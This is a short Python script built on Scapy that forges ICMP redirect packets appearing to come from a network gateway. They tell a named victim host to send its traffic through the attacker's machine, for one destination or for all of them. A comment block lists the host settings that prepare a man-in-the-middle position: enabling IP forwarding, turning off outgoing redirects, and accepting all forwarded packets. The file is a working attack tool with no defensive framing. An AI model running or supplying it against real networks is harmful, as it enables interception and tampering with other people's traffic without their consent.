#!/usr/bin/env python3

'''
# icmpcodes[5] = { 0: 'network-redirect', 1: 'host-redirect', 2: 'TOS-network-redirect', 3: 'TOS-host-redirect' }
# sudo sh -c 'echo 1 > /proc/sys/net/ipv4/ip_forward'
# sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/all/send_redirects'
# sudo sh -c 'echo 0 > /proc/sys/net/ipv4/conf/wlp0s20f3/send_redirects'
# sudo iptables -P FORWARD ACCEPT
'''

import sys
from scapy.all import *

conf.L3socket=L3RawSocket
#conf.ipv6_enabled=False

if len(sys.argv) < 5:
    print("Send ICMP redirect message from [ip_gateway] to [ip_victim], thus redirecting traffic")
    print("to [ip_myself] with destion MAC address [mac_addr_victim] for destination [ip_destination_to_redirect]")
    print("You can also specify 0.0.0.0 as [ip_destination_to_redirect] to apply to all dst IP")
    print("Usage:", sys.argv[0], "[ip_gateway]", "[ip_victim]", "[ip_myself]", "[mac_addr_victim] [ip_destination_to_redirect]")
    print("Example:", sys.argv[0], "192.168.0.1 192.168.0.20 192.168.0.10 ca:fe:ca:fe:ca:fe 0.0.0.0")
    exit(1)

#conf.iface='ppp0'
#conf.iface='wlan0'
conf.iface='wlp0s20f3'
ROUTER=sys.argv[1]
VICTIM=sys.argv[2]
MYSELF=sys.argv[3]
MACDST=sys.argv[4]
DESTIN=sys.argv[5]

# send at L2
#packet=Ether(dst=MACDST)/ \
#       IP(src=ROUTER, dst=VICTIM, flags='DF')/ \
#       ICMP(type=5, code=1, gw=MYSELF) / \
#       IP(src=VICTIM, dst=DESTIN, flags='DF') / \
#       ICMP()
#       #TCP(sport=int(RandShort()), dport=80, flags='PA', seq=int(RandInt()), ack=int(RandInt()))
#interact(mydict=globals())
#sendp(packet)


# send at L3
packet=IP(src=ROUTER, dst=VICTIM)/ \
       ICMP(type=5, code=1, gw=MYSELF) / \
       IP(src=VICTIM, dst=DESTIN)

send(packet)

print('[+] sent ICMP type 5 to IP', VICTIM, 'redirecting dst trafic to', DESTIN, 'to', MYSELF)
